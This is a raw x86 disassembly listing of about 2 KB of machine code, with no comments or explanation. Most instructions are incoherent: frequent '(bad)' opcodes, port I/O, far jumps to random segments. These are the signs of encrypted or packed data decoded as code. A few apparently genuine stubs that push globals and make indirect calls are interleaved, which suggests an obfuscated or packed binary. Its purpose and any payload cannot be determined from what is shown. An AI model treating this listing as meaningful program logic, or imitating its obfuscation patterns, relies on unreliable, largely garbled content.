  403fff:	xor    ebp,DWORD PTR [edx-0x1836e140]
  404005:	mov    edx,0xe2e4b3aa
  40400a:	in     al,dx
  40400b:	cmp    edi,DWORD PTR [esi+0xb]
  40400e:	adc    edx,ebp
  404010:	jmp    0xbb9c:0x9c034338
  404017:	pop    ebp
  404018:	xor    eax,0xdb85dc0a
  40401d:	mov    esp,0xf1c632a6
  404022:	jnp    0x40400e
  404024:	(bad)  
  404026:	mov    edx,0x4b1cb25b
  40402b:	add    DWORD PTR [edi+0x12],eax
  40402e:	sbb    ah,dh
  404030:	adc    ch,BYTE PTR [ecx-0x13]
  404033:	dec    ebp
  404034:	mov    eax,ds:0x9b7eb0af
  404039:	leave  
  40403a:	push   ecx
  40403b:	ja     0x40406e
  40403d:	jns    0x404077
  40403f:	cs or  al,bh
  404042:	popf   
  404043:	or     eax,0xa82432d7
  404048:	sub    DWORD PTR [edx-0x30],edx
  40404b:	or     dh,BYTE PTR [esp+edi*2+0x659d3bdc]
  404052:	sub    bl,BYTE PTR [ecx-0x3149e2ee]
  404058:	xchg   esp,eax
  404059:	setno  dl
  40405c:	in     al,0x9c
  40405e:	bound  eax,QWORD PTR [esi+0x4770088e]
  404064:	mov    ch,0x8e
  404066:	retf   0xede8
  404069:	cmc    
  40406a:	fwait
  40406b:	mov    al,0x96
  40406d:	repnz sti 
  40406f:	aad    0x95
  404071:	cwde   
  404072:	sar    DWORD PTR [ebp-0x2b3adea0],1
  404078:	add    al,0x2f
  40407a:	out    dx,eax
  40407b:	xchg   edx,eax
  40407c:	scas   eax,DWORD PTR es:[edi]
  40407d:	fld    QWORD PTR [edx]
  40407f:	lods   eax,DWORD PTR ds:[esi]
  404080:	xor    al,0x8e
  404082:	scas   al,BYTE PTR es:[edi]
  404083:	pop    ebp
  404084:	fcmovnb st,st(1)
  404086:	dec    edi
  404087:	or     al,0xcc
  404089:	and    al,BYTE PTR [esi-0x12]
  40408c:	cli    
  40408d:	(bad)  
  40408e:	sbb    ecx,DWORD PTR [esi-0x260c686a]
  404094:	push   cs
  404095:	add    eax,0xa2f29519
  40409a:	je     0x40405b
  40409c:	jne    0x4040c5
  40409e:	mov    edi,0x6b20ac9d
  4040a3:	cs popf 
  4040a5:	jmp    0x3c31:0xb377cdc3
  4040ac:	stos   DWORD PTR es:[edi],eax
  4040ad:	sub    DWORD PTR [esi+0x5c],eax
  4040b0:	jnp    0x40412d
  4040b2:	test   esi,esi
  4040b4:	rol    ebp,1
  4040b6:	xor    ebp,DWORD PTR [edi+0x1c]
  4040b9:	in     eax,0x77
  4040bb:	(bad)  
  4040bc:	ficomp WORD PTR [edx]
  4040be:	rcl    DWORD PTR [ecx+ebx*1+0x5cb2fbe6],0x17
  4040c6:	inc    edi
  4040c7:	mov    edi,0x2aff9c86
  4040cc:	test   DWORD PTR [ecx-0x67],eax
  4040cf:	mov    ecx,0xd193af7d
  4040d4:	sbb    al,0xb
  4040d6:	mov    esi,DWORD PTR [edi+ecx*1+0x5a708c8c]
  4040dd:	xacquire xchg DWORD PTR [esi+0x33],esp
  4040e1:	sbb    eax,0x6b722fb1
  4040e6:	retf   0x3c85
  4040e9:	cmp    esi,DWORD PTR [ebp+0x5e]
  4040ec:	sub    esi,ebx
  4040ee:	jbe    0x4040b5
  4040f0:	jmp    0x85ea322b
  4040f5:	ins    DWORD PTR es:[edi],dx
  4040f6:	gs es inc edi
  4040f9:	mov    ah,0x38
  4040fb:	adc    BYTE PTR [edi+edi*2+0x1ccd891],bl
  404102:	cwde   
  404103:	sbb    eax,0xf085585
  404108:	push   0xffffff91
  40410a:	in     al,dx
  40410b:	xor    ebx,edx
  40410d:	call   eax
  40410f:	aad    0xd9
  404111:	or     edx,DWORD PTR [edi]
  404113:	pop    ecx
  404114:	push   edx
  404115:	icebp  
  404116:	cmp    eax,0x5a017a77
  40411b:	aam    0x8b
  40411d:	jnp    0x40413e
  40411f:	fcom   DWORD PTR [ebp-0x2d]
  404122:	in     al,dx
  404123:	xor    DWORD PTR [esi-0x1c],esi
  404126:	test   BYTE PTR [edx],bl
  404128:	pop    ds
  404129:	push   0x5e
  40412b:	push   eax
  40412c:	jle    0x4040bc
  40412e:	lods   eax,DWORD PTR ds:[esi]
  40412f:	js     0x404100
  404131:	out    dx,al
  404132:	sub    dh,dh
  404134:	je     0x4040f6
  404136:	pop    edi
  404137:	outs   dx,DWORD PTR ds:[esi]
  404138:	cmp    BYTE PTR [ecx],ch
  40413a:	jae    0x404114
  40413c:	xchg   esi,eax
  40413d:	inc    ebx
  40413e:	cld    
  40413f:	pop    eax
  404140:	cmp    al,BYTE PTR [ecx+0x5a]
  404143:	push   cs
  404144:	cmp    DWORD PTR [eax-0x53f7e35],edi
  40414a:	inc    ebx
  40414b:	xchg   edi,eax
  40414c:	or     eax,0x9ced3206
  404151:	lods   eax,DWORD PTR ds:[si]
  404153:	or     bh,0xa5
  404156:	mov    al,ds:0x884249b4
  40415b:	jne    0x404142
  40415d:	xlat   BYTE PTR ds:[ebx]
  40415e:	sar    BYTE PTR [ebp+0x34a36e77],cl
  404164:	pop    ecx
  404165:	mov    esp,0xf85978e2
  40416a:	xor    DWORD PTR [esi],eax
  40416c:	repnz aam 0x93
  40416f:	outs   dx,DWORD PTR ds:[esi]
  404170:	and    dh,0x83
  404173:	fbstp  TBYTE PTR gs:[esi]
  404176:	push   es
  404177:	nop
  404178:	(bad)  
  404179:	inc    edx
  40417a:	out    0x8c,eax
  40417c:	adc    al,0xae
  40417e:	xchg   BYTE PTR [ebp+edi*1-0x6],dh
  404182:	jb     0x404115
  404184:	sar    dh,1
  404186:	in     eax,dx
  404187:	xchg   esp,eax
  404188:	or     edi,DWORD PTR [ecx+ecx*4]
  40418b:	fmul   DWORD PTR [ecx-0x3232fc1a]
  404191:	outs   dx,DWORD PTR ds:[esi]
  404192:	mov    dl,0x8c
  404194:	dec    ebp
  404195:	sub    eax,DWORD PTR [edx+0x4692aa80]
  40419b:	ja     0x4041cf
  40419d:	imul   edx,DWORD PTR [ecx-0x7ad724ee],0xffffffe7
  4041a4:	jp     0x404212
  4041a6:	pop    edi
  4041a7:	jno    0x404179
  4041a9:	addr16 (bad) 
  4041ab:	out    0xd2,al
  4041ad:	inc    esp
  4041ae:	dec    esi
  4041af:	jae    0x40418c
  4041b1:	xchg   edi,eax
  4041b2:	inc    edx
  4041b3:	ja     0x404138
  4041b5:	leave  
  4041b6:	ret    
  4041b7:	ja     0x40420d
  4041b9:	sbb    dl,cl
  4041bb:	scas   eax,DWORD PTR es:[edi]
  4041bc:	jo     0x4041cd
  4041be:	into   
  4041bf:	outs   dx,BYTE PTR ds:[esi]
  4041c0:	test   BYTE PTR [eax-0x49],dl
  4041c3:	aam    0x7c
  4041c5:	mov    ch,0x61
  4041c7:	cld    
  4041c8:	ins    BYTE PTR es:[edi],dx
  4041c9:	xchg   ebx,eax
  4041ca:	lods   al,BYTE PTR ds:[esi]
  4041cb:	pop    es
  4041cc:	or     bl,0x57
  4041cf:	(bad)  
  4041d1:	add    eax,0xcdf18ef2
  4041d6:	xchg   BYTE PTR [ebp+0x3e],bh
  4041d9:	das    
  4041da:	pop    edi
  4041db:	adc    eax,DWORD PTR [eax]
  4041dd:	xchg   edi,eax
  4041de:	loop   0x4041a2
  4041e0:	dec    DWORD PTR [eax+0x14]
  4041e3:	adc    al,0xae
  4041e5:	popf   
  4041e6:	ins    BYTE PTR es:[edi],dx
  4041e7:	push   ss
  4041e8:	fwait
  4041e9:	inc    esi
  4041ea:	aas    
  4041eb:	ret    0xe12d
  4041ee:	ds enter 0xa866,0x12
  4041f3:	pop    ss
  4041f4:	(bad)  
  4041f5:	or     al,0xb3
  4041f7:	xor    eax,DWORD PTR [edx-0x1cff1aae]
  4041fd:	add    al,0x23
  4041ff:	cmp    bh,BYTE PTR [eax-0x77c2c8d3]
  404205:	mov    ds:0x25107ca9,al
  40420a:	xchg   DWORD PTR [ebp+0x3c],esi
  40420d:	push   esi
  40420e:	pop    ecx
  40420f:	xchg   ecx,edx
  404211:	dec    BYTE PTR [edx]
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si-0x2a],0xffffffdd
  404248:	jne    0x404217
  40424a:	aad    0x25
  40424c:	jle    0x4042cc
  40424e:	outs   dx,DWORD PTR ds:[esi]
  40424f:	jge    0x4042cf
  404251:	jle    0x40423a
  404253:	lds    ecx,FWORD PTR [ecx-0x6fcebb68]
  404259:	nop
  40425a:	ror    DWORD PTR [esi+0x4a67076d],1
  404260:	fwait
  404261:	push   esp
  404262:	mov    es,ebp
  404264:	retf   0x3d57
  404267:	not    DWORD PTR [ebx+0x3b]
  40426a:	mov    ds:0x8ec293ba,eax
  40426f:	mov    ecx,esp
  404271:	and    DWORD PTR [edi],ebp
  404273:	mov    ds:0xdcab9d93,al
  404278:	imul   ebx,eax,0xffffffe8
  40427b:	sub    al,0x89
  40427d:	mov    ebx,0x2548cd09
  404282:	aam    0xee
  404284:	rcr    DWORD PTR [ebx+0x5401f948],0x66
  40428b:	and    ah,BYTE PTR [eax+0x54]
  40428e:	mov    ds:0xcc5e9767,al
  404293:	jns    0x4042c4
  404295:	add    dh,BYTE PTR [edi-0x7424521f]
  40429b:	push   0x1d
  40429d:	dec    ecx
  40429e:	dec    esp
  40429f:	pop    edi
  4042a0:	dec    esi
  4042a1:	add    BYTE PTR [edi+0x76807d7f],al
  4042a7:	push   edi
  4042a8:	cmc    
  4042a9:	and    cl,bl
  4042ab:	ret    
  4042ac:	out    0x74,eax
  4042ae:	rol    BYTE PTR [ecx],0x5a
  4042b1:	sbb    esi,DWORD PTR [ecx+ebp*4+0x6534468]
  4042b8:	dec    eax
  4042b9:	popa   
  4042ba:	dec    ebp
  4042bb:	dec    ebx
  4042bc:	(bad)  
  4042bd:	jle    0x40427f
  4042bf:	popw   es
  4042c1:	jmp    0x5c740f85
  4042c6:	jp     0x4042ab
  4042c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042c9:	jp     0x40426c
  4042cb:	xor    DWORD PTR [edx-0x5a46b53],eax
  4042d1:	push   esp
  4042d2:	dec    edi
  4042d3:	push   eax
  4042d4:	lea    ebp,[edi]
  4042d6:	jb     0x40427c
  4042d8:	bound  eax,QWORD PTR [edi+eax*2+0x7b]
  4042dc:	sub    bl,BYTE PTR [ebx]
  4042de:	mov    edi,0xc1221c0b
  4042e3:	aas    
  4042e4:	push   ebx
  4042e5:	js     0x404355
  4042e7:	push   0x893b0bb7
  4042ec:	xchg   edi,eax
  4042ed:	pop    ecx
  4042ee:	lea    esp,[edi]
  4042f0:	xor    al,BYTE PTR ds:0x8170bc37
  4042f6:	mov    ch,0xa8
  4042f8:	out    0x7c,eax
  4042fa:	cli    
  4042fb:	dec    edi
  4042fc:	pop    ss
  4042fd:	jge    0x40436a
  4042ff:	xchg   ebp,eax
  404300:	cmc    
  404301:	loope  0x404365
  404303:	into   
  404304:	lods   eax,DWORD PTR ds:[esi]
  404305:	lds    eax,FWORD PTR [edi+0x1831af18]
  40430b:	cwde   
  40430c:	mov    ds:0x11939b85,al
  404311:	leave  
  404312:	push   cs
  404313:	sbb    DWORD PTR ds:[ecx+eax*1],edx
  404317:	adc    eax,0x58a7347f
  40431c:	pop    edx
  40431d:	dec    esi
  40431e:	jne    0x4042ac
  404320:	rol    BYTE PTR [ecx-0x9],cl
  404323:	push   edi
  404324:	inc    ebp
  404325:	add    bl,al
  404327:	scas   al,BYTE PTR es:[edi]
  404328:	icebp  
  404329:	pop    esp
  40432a:	jmp    0x2a2b:0xff4f08e1
  404331:	push   ebx
  404332:	(bad)  
  404335:	jp     0x404379
  404337:	mov    BYTE PTR [edi+0x1b6c8df0],ch
  40433d:	ret    0x8e3d
  404340:	mov    bh,0x8a
  404342:	push   ecx
  404343:	into   
  404344:	int    0xc1
  404346:	or     esp,0xd
  404349:	or     eax,0xe60e829e
  40434e:	adc    DWORD PTR [edi-0x43],0x467efb62
  404355:	push   ebp
  404356:	jne    0x4042d8
  404358:	inc    ebp
  404359:	xchg   ebx,eax
  40435a:	mov    ch,0xd5
  40435c:	arpl   WORD PTR [eax+0x72],sp
  40435f:	cmp    BYTE PTR [eax-0x7fc65803],ch
  404365:	add    eax,0x4fb6a2ea
  40436a:	xor    al,0x44
  40436c:	add    BYTE PTR [edi+0x72],bl
  40436f:	cmp    BYTE PTR [edx+ecx*4],bl
  404372:	leave  
  404373:	div    BYTE PTR [edi]
  404375:	ins    DWORD PTR es:[edi],dx
  404376:	push   edi
  404377:	fisubr DWORD PTR [ebx]
  404379:	or     DWORD PTR [ebp+0x3760c63],esp
  40437f:	sub    eax,eax
  404381:	call   0xf09f:0x29ba3a47
  404388:	add    bl,al
  40438a:	(bad)  
  40438c:	retf   0x9be6
  40438f:	xor    eax,0x9b83b804
  404394:	cmp    eax,0xbb8a307b
  404399:	add    dh,al
  40439b:	and    eax,0xffb31b69
  4043a0:	scas   al,BYTE PTR es:[edi]
  4043a1:	cmovne ebx,DWORD PTR [ebp-0x669bf8a1]
  4043a8:	dec    ecx
  4043a9:	out    0xb6,al
  4043ab:	cmovnp edx,esi
  4043ae:	stos   BYTE PTR es:[edi],al
  4043af:	adc    BYTE PTR [ebx],0x63
  4043b2:	(bad)  
  4043b3:	(bad)  
  4043b5:	inc    edi
  4043b6:	add    dh,BYTE PTR [ebx-0x2c616e22]
  4043bc:	lods   al,BYTE PTR ds:[esi]
  4043bd:	mov    ah,0xe6
  4043bf:	dec    edx
  4043c0:	ja     0x404383
  4043c2:	xlat   BYTE PTR ds:[ebx]
  4043c3:	loope  0x4043f0
  4043c5:	(bad)  [edi+0x13a9ae83]
  4043cb:	dec    esi
  4043cc:	cwde   
  4043cd:	sbb    ch,bl
  4043cf:	stos   DWORD PTR es:[edi],eax
  4043d0:	out    dx,eax
  4043d1:	add    BYTE PTR [ecx+0x38f5dda1],bh
  4043d7:	in     al,0x74
  4043d9:	std    
  4043da:	stos   BYTE PTR es:[edi],al
  4043db:	and    bh,dh
  4043dd:	and    esi,0x26
  4043e0:	dec    ebp
  4043e1:	stc    
  4043e2:	(bad)  
  4043e3:	pop    esi
  4043e4:	jge    0x40444a
  4043e6:	daa    
  4043e7:	jle    0x404450
  4043e9:	loop   0x404440
  4043eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ec:	into   
  4043ed:	sti    
  4043ee:	call   0xe453:0x694a96f4
  4043f5:	push   0xffffffaf
  4043f7:	jge    0x4043a6
  4043f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043fa:	pop    esi
  4043fb:	dec    ecx
  4043fc:	(bad)  
  4043fd:	imul   ebp,edi,0x9747cb92
  404403:	dec    esi
  404404:	sbb    dl,bl
  404406:	and    DWORD PTR [edx+0x3f],edi
  404409:	std    
  40440a:	(bad)  
  40440b:	dec    ebp
  40440d:	std    
  40440e:	sub    cl,BYTE PTR [ecx-0x3ae61bdd]
  404414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404415:	mov    bh,0xd0
  404417:	mov    al,ds:0xa7ab5ac2
  40441c:	aaa    
  40441d:	imul   esi,DWORD PTR [eax-0x183a1a95],0xd937bb16
  404427:	call   0xe8d7:0x57fe90fe
  40442e:	inc    ebx
  40442f:	xor    ecx,ebx
  404431:	inc    esi
  404432:	jns    0x4043ff
  404434:	jo     0x40447a
  404436:	mov    dh,0x4
  404438:	into   
  404439:	xor    dl,al
  40443b:	ja     0x404497
  40443d:	inc    edx
  40443e:	in     al,dx
  40443f:	test   eax,0x65899c21
  404444:	mov    edi,eax
  404446:	adc    BYTE PTR [ebp-0x2adeda69],dl
  40444c:	adc    al,0x77
  40444e:	adc    BYTE PTR [edx+0x4a],dh
  404451:	jnp    0x404433
  404453:	jae    0x4044c7
  404455:	lods   al,BYTE PTR ds:[esi]
  404456:	cdq    
  404457:	js     0x404425
  404459:	inc    ecx
  40445a:	mov    dl,0x78
  40445c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40445d:	(bad)  
  40445e:	daa    
  40445f:	or     bh,BYTE PTR [ecx-0x67e62bca]
  404465:	mov    esi,ebp
  404467:	scas   eax,DWORD PTR es:[edi]
  404468:	push   edi
  404469:	xchg   esp,eax
  40446a:	jae    0x404444
  40446c:	outs   dx,DWORD PTR ds:[esi]
  40446d:	xchg   ebp,eax
  40446e:	popf   
  40446f:	fsubr  QWORD PTR [eax]
  404471:	or     al,0xc3
  404473:	sbb    al,0x4b
  404475:	addr16 xor dh,al
  404478:	xor    cl,BYTE PTR [ebx+0x52662753]
  40447e:	js     0x404490
  404480:	out    dx,al
  404481:	xchg   esi,eax
  404482:	(bad)  
  404483:	jmp    0xa243:0x151e8786
  40448a:	fwait
  40448b:	inc    edi
  40448c:	daa    
  40448d:	cmp    edx,DWORD PTR [edi+0x36e06b69]
  404493:	ficomp DWORD PTR [eax-0xc3777e0]
  404499:	mov    dl,0x11
  40449b:	cmp    DWORD PTR [edx+0x29060801],esi
  4044a1:	add    edx,DWORD PTR [edi-0x7a]
  4044a4:	in     eax,0xc9
  4044a6:	push   edi
  4044a7:	jo     0x4044b9
  4044a9:	jge    0x40444e
  4044ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ac:	jb     0x4044f9
  4044ae:	push   cs
  4044af:	jecxz  0x4044c6
  4044b1:	lock jo 0x40448d
  4044b4:	sbb    DWORD PTR [ebx+0x6acc7137],ebx
  4044ba:	out    dx,eax
  4044bb:	popf   
  4044bc:	shl    BYTE PTR [ebp+eiz*4-0x3c],cl
  4044c0:	sub    al,0x1f
  4044c2:	ss (bad) 
  4044c4:	mov    al,ds:0xd63a9426
  4044c9:	sar    DWORD PTR [eax-0x7b],cl
  4044cc:	test   al,0xeb
  4044ce:	leave  
  4044cf:	repz fs xchg ebx,eax
  4044d2:	inc    ecx
  4044d3:	jb     0x4044ae
  4044d5:	push   edi
  4044d6:	(bad)  
  4044d8:	mov    eax,0x8e51ad68
  4044dd:	xlat   BYTE PTR ds:[ebx]
  4044de:	jno    0x404551
  4044e0:	inc    edi
  4044e1:	(bad)
  4044e6:	sub    eax,DWORD PTR [esi]
  4044e8:	cdq    
  4044e9:	cwde   
  4044ea:	adc    eax,0x59b14a6
  4044ef:	mov    ebx,0x10279d46
  4044f4:	aam    0x1b
  4044f6:	xlat   BYTE PTR ds:[ebx]
  4044f7:	hlt    
  4044f8:	repz test bh,dh
  4044fb:	mov    edx,0x6e405fd1
  404500:	into   
  404501:	cmc    
  404502:	mov    bl,0x68
  404504:	xchg   edi,eax
  404506:	call   0x93a9:0x4f0a11df
  40450d:	mov    cl,0x10
  40450f:	mov    al,ds:0x543fd104
  404514:	js     0x4044d3
  404516:	fnstenv [ebp+0x37f5ea5b]
  40451c:	xlat   BYTE PTR ds:[ebx]
  40451d:	enter  0x93f7,0xef
  404521:	std    
  404522:	xchg   ebx,eax
  404523:	loope  0x404589
  404525:	jno    0x4044f1
  404527:	adc    BYTE PTR [ebp-0x5c],ch
  40452a:	fcom   QWORD PTR [ecx+0xf226063]
  404530:	out    dx,al
  404531:	cs dec edi
  404533:	pop    ebp
  404534:	jl     0x404521
  404536:	mov    dl,0xe0
  404538:	(bad)  
  404539:	xor    edi,DWORD PTR [esi]
  40453b:	inc    edx
  40453c:	sbb    al,0xdd
  40453e:	cmp    ebx,DWORD PTR [eax]
  404540:	div    DWORD PTR [edx-0x39d57039]
  404546:	stos   BYTE PTR es:[edi],al
  404547:	pop    ebp
  404548:	add    ebp,0xffffff9b
  40454b:	add    bl,BYTE PTR [edx+0x65]
  40454e:	jecxz  0x40457f
  404550:	xchg   esi,eax
  404551:	dec    DWORD PTR [ecx+ecx*1-0x1e2a906f]
  404558:	dec    edx
  404559:	jge    0x404567
  40455b:	sub    BYTE PTR [ebp+0x3d],ch
  40455e:	sub    al,0xd4
  404560:	jno    0x4045bd
  404562:	mov    al,0xc4
  404564:	fxch   st(0)
  404566:	or     DWORD PTR [ebx+0x64bb3499],ebx
  40456c:	sbb    al,0x2
  40456e:	add    dl,BYTE PTR [esi]
  404570:	sub    al,dh
  404572:	xchg   esp,eax
  404573:	push   edi
  404574:	mov    dh,0xab
  404576:	outs   dx,DWORD PTR ds:[esi]
  404577:	mov    bh,0x27
  404579:	and    DWORD PTR [edx-0x666c5463],edx
  40457f:	hlt    
  404580:	mov    ebp,0xd5453f03
  404585:	out    0xba,eax
  404587:	aaa    
  404588:	int3   
  404589:	xchg   DWORD PTR [ecx+0x78b4071f],edi
  40458f:	jg     0x404584
  404591:	fisub  DWORD PTR [esi+eax*8-0x37003846]
  404598:	shl    DWORD PTR [edi-0x2220eb59],0xbf
  40459f:	pop    edi
  4045a0:	cmp    BYTE PTR [edi+ebx*1+0x35ec14fe],bl
  4045a7:	dec    ebp
  4045a8:	add    ebp,DWORD PTR [edx-0x5cfd20f8]
  4045ae:	(bad)  
  4045af:	imul   edx,DWORD PTR [ebx-0x40],0x31
  4045b3:	push   edi
  4045b4:	xchg   esi,eax
  4045b5:	lock jmp 0xf305246b
  4045bb:	call   0xfc0e:0xccd869cd
  4045c2:	jg     0x4045d9
  4045c4:	cmp    eax,0xd65eaa68
  4045c9:	(bad)  
  4045ca:	data16 test BYTE PTR [edx+eax*4],ch
  4045ce:	push   esp
  4045cf:	pop    esi
  4045d0:	outs   dx,DWORD PTR ds:[esi]
  4045d1:	pushf  
  4045d2:	pop    esp
  4045d3:	mov    al,ah
  4045d5:	scas   al,BYTE PTR es:[edi]
  4045d6:	mov    WORD PTR [ecx-0x384b6583],ss
  4045dc:	push   ebx
  4045dd:	cli    
  4045de:	jp     0x4045e4
  4045e0:	inc    ebx
  4045e1:	adc    bl,dl
  4045e3:	jb     0x4045b5
  4045e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045e6:	lahf   
  4045e7:	xchg   edx,eax
  4045e8:	sub    BYTE PTR [edx+0x21],dh
  4045eb:	jmp    FWORD PTR [eax-0x29]
  4045ee:	push   edi
  4045ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045f0:	sahf   
  4045f1:	fisttp QWORD PTR [edx-0x29]
  4045f4:	sahf   
  4045f5:	and    al,0xcb
  4045f7:	or     esi,edx
  4045f9:	pop    edx
  4045fa:	push   es
  4045fb:	adc    BYTE PTR [esi+edx*1+0x2f8c63a0],0xb9
  404603:	lds    eax,FWORD PTR ds:0xda8dae3e
  404609:	cmp    edi,0xeb72a922
  40460f:	or     al,0xf9
  404611:	bound  ebp,QWORD PTR [ebp-0x62cb3623]
  404617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404618:	cdq    
  404619:	mov    cl,BYTE PTR [ecx]
  40461b:	mov    ecx,0x78116996
  404620:	mov    eax,0xced5b712
  404625:	imul   ebp,esi,0xffffff8b
  404628:	ins    DWORD PTR es:[edi],dx
  404629:	pop    ss
  40462a:	fldcw  WORD PTR [esi-0x4b]
  40462d:	jne    0x4045d4
  40462f:	cwde   
  404630:	jg     0x40465b
  404632:	xlat   BYTE PTR ds:[ebx]
  404633:	add    ah,BYTE PTR [ebp-0x4c]
  404636:	bound  edx,QWORD PTR [eax-0x42941d40]
  40463c:	les    esp,FWORD PTR [ebx]
  40463e:	or     al,0xa7
  404640:	xor    eax,0x30ffbfb2
  404645:	lea    eax,ds:0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0x322233e3
  404675:	mov    edx,es
  404677:	and    DWORD PTR [esi+0x7e],edi
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	jge    0x4046fb
  40467d:	jle    0x404679
  40467f:	js     0x4046a8
  404681:	mov    al,0x72
  404683:	nop
  404684:	cs pop esp
  404686:	mov    bl,0xc0
  404688:	sbb    al,0xf
  40468a:	mov    al,0x70
  40468c:	ja     0x404698
  40468e:	sti    
  40468f:	ins    BYTE PTR es:[edi],dx
  404690:	xor    dl,BYTE PTR [ecx]
  404692:	out    dx,eax
  404693:	xchg   BYTE PTR [ebx],ch
  404695:	dec    esi
  404696:	hlt    
  404697:	icebp  
  404698:	or     al,ch
  40469a:	(bad)  
  40469b:	add    DWORD PTR cs:[edi+0x7b],ebx
  40469f:	(bad)  
  4046a0:	ffree  st(0)
  4046a2:	sub    eax,0x815e9323
  4046a7:	in     al,dx
  4046a8:	call   0x3fd1f726
  4046ad:	jp     0x40467d
  4046af:	js     0x4046ad
  4046b1:	pop    esi
  4046b2:	sub    edx,ebp
  4046b4:	sub    ebp,DWORD PTR [ebx]
  4046b6:	or     ebp,edi
  4046b8:	sti    
  4046b9:	data16 jl 0x40464c
  4046bc:	lods   eax,DWORD PTR ds:[esi]
  4046bd:	rcl    DWORD PTR [esi+0x6a0bae68],cl
  4046c3:	mov    eax,ds:0xc13cf62f
  4046c8:	mov    bh,0x32
  4046ca:	mov    ds:0xb019dfbf,al
  4046cf:	scas   al,BYTE PTR es:[edi]
  4046d0:	or     DWORD PTR [ebp+ebx*2-0xa],ebp
  4046d4:	lock gs jle 0x4046db
  4046d8:	cmp    cl,cl
  4046da:	iret   
  4046db:	mov    bl,0x8b
  4046dd:	sbb    dl,0xb6
  4046e0:	(bad)  
  4046e1:	inc    ebx
  4046e2:	mov    bh,0x74
  4046e4:	jecxz  0x404679
  4046e6:	pop    ds
  4046e7:	sub    BYTE PTR [edi+0x1d],dl
  4046ea:	sub    BYTE PTR [edi],bl
  4046ec:	mov    cl,0xd2
  4046ee:	mov    ds:0xa8ef1c4d,al
  4046f3:	addr16 push esp
  4046f5:	lahf   
  4046f6:	mov    dl,0x13
  4046f8:	cdq    
  4046f9:	and    ch,BYTE PTR [ebx]
  4046fb:	sbb    BYTE PTR [esi],ch
  4046fd:	hlt    
  4046fe:	pop    edi
  4046ff:	jne    0x4046f7
  404701:	mov    dl,0x28
  404703:	shl    BYTE PTR [eax-0xb],0x43
  404707:	cmc    
  404708:	pop    esp
  404709:	pop    es
  40470a:	out    dx,al
  40470b:	mov    dl,0xf2
  40470d:	push   0x54
  40470f:	icebp  
  404710:	imul   ebp,DWORD PTR [edx],0xc615ba04
  404716:	pop    ss
  404717:	mov    ecx,0xd8b1b4c0
  40471c:	jo     0x40472b
  40471e:	sti    
  40471f:	repnz and eax,0xb9db4537
  404725:	les    ebp,FWORD PTR [edi]
  404727:	push   0x13b68787
  40472c:	mov    eax,0xe9a64bfb
  404731:	inc    edx
  404732:	add    ebp,DWORD PTR [edx+0x34]
  404735:	inc    ebp
  404736:	hlt    
  404737:	dec    ebx
  404738:	jge    0x40477c
  40473a:	out    0x57,eax
  40473c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40473d:	or     al,0x95
  40473f:	ins    DWORD PTR es:[edi],dx
  404740:	mov    es,ecx
  404742:	sbb    BYTE PTR [ecx+ecx*8+0x32476985],dl
  404749:	lea    edi,[eax-0x43113d43]
  40474f:	fdiv   QWORD PTR [ebx+0x37f630ea]
  404755:	dec    esi
  404756:	mov    eax,ds:0xcb43d5ea
  40475b:	push   eax
  40475c:	dec    esp
  40475d:	jl     0x40474e
  40475f:	mov    WORD PTR [ecx-0x2781de3],?
  404765:	sbb    al,0x39
  404767:	dec    esp
  404768:	addr16 cmp al,0x7d
  40476b:	adc    DWORD PTR [ebx+edx*1-0x5e],edx
  40476f:	mov    ch,0x32
  404771:	jb     0x4047b3
  404773:	add    edi,ecx
  404775:	mov    ds:0x83be21eb,al
  40477a:	pop    ebp
  40477b:	cmp    al,0xd9
  40477d:	push   edx
  40477e:	push   edi
  40477f:	ins    BYTE PTR es:[edi],dx
  404780:	(bad)  
  404781:	icebp  
  404782:	or     dh,BYTE PTR [ebp+0x31b40cc5]
  404788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404789:	repnz std 
  40478b:	out    0xbc,al
  40478d:	jge    0x4047d8
  40478f:	jl     0x404781
  404791:	push   edx
  404792:	jl     0x404731
  404794:	into   
  404795:	and    ebp,DWORD PTR [edi+0x28]
  404798:	sahf   
  404799:	mov    esi,0x3ddb3b1
  40479e:	fwait
  40479f:	mov    esi,esi
  4047a1:	fidiv  DWORD PTR [esi+0x2d]
  4047a4:	imul   edi,DWORD PTR [ecx],0x7d518d0a
  4047aa:	jle    0x404799
  4047ac:	aaa    
  4047ad:	sub    eax,0xacec9d5b
  4047b2:	jl     0x404826
  4047b4:	dec    edi
  4047b5:	test   DWORD PTR [ebx-0x1971bfe5],esp
  4047bb:	ja     0x4047c8
  4047bd:	(bad)  
  4047be:	push   eax
  4047bf:	pop    ebx
  4047c0:	out    0x2f,eax
  4047c2:	repz hlt 
  4047c4:	xor    BYTE PTR [ebx+ebp*4],ah
